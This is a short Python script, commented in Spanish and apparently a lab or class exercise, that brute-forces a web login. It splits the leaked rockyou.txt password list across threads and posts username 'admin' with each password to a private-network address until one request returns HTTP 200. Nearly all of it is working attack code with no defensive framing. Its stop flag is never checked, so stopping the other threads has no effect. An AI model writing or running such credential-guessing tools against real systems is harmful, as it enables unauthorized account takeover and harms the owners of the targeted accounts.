import threading
import requests
from datetime import datetime

class Mi_hilo(threading.Thread):
    def __init__(self, contrasenas, url):
        self.url = url
        # Recibe los atributos de este hilo
        self.contrasenas = contrasenas
        # Inicializa flag de finalización del hilo
        self.final = False
        # Inicializa el Thread, llamando a la superclase
        threading.Thread.__init__(self)

    # Este método sustituye al target del Thread
    # Código que ejecuta cada hilo
    def run(self): 
        with requests.session() as s:
            for contrasena in self.contrasenas:
                    datos = {'username': 'admin','password':contrasena}
                    peticion = s.post(self.url,data=datos)
                    if  peticion.status_code == 200:
                        for hilo in self.hilos:
                            # No para el hilo actual
                            if hilo!=self:
                                hilo.stop()
                        return
    
    # Definimos stop() activando la flag de finalización
    def stop(self):
        self.final = True

    # Sobrecargamos método start para recibir la lista con el resto de hilos
    def start(self, hilos):
        self.hilos = hilos
        # Llama al método start() de la superclase
        threading.Thread.start(self)
    

if __name__ == '__main__':

    n_hilos = 3
    lista_contrasenas = []
    contrasena = []
    contador = 0
    restantes = 0
    saltar = False
    with open("rockyou.txt", "r", encoding="ANSI") as fman:
        total_filas = len(fman.readlines())
        if total_filas % n_hilos:
            restantes = total_filas % n_hilos
        salto = total_filas // n_hilos

    with open("rockyou.txt", "r", encoding="ANSI") as fman:
        while contador <= total_filas:
            if contador + total_filas // n_hilos > total_filas:
                break
            # Dividimos todas las contraseñas según hilos
            contrasena = []
            for _ in range(contador, salto):
                contrasena.append(fman.readline().rstrip())
            # Contraseñas sobrantes
            lista_contrasenas.append(contrasena)
            contador += total_filas // n_hilos
            salto += total_filas // n_hilos
        if restantes:
            for _ in range(restantes):
                contrasena.append(fman.readline().rstrip())

    url = 'http://192.168.9.225'
    # Lista de hilos
    hilos = []
    # Crea los hilos
    for i in range(len(lista_contrasenas)):
        hilos.append(Mi_hilo(lista_contrasenas[i], url))
    # Inicia los hilos
    for hilo in hilos:
        hilo.start(hilos)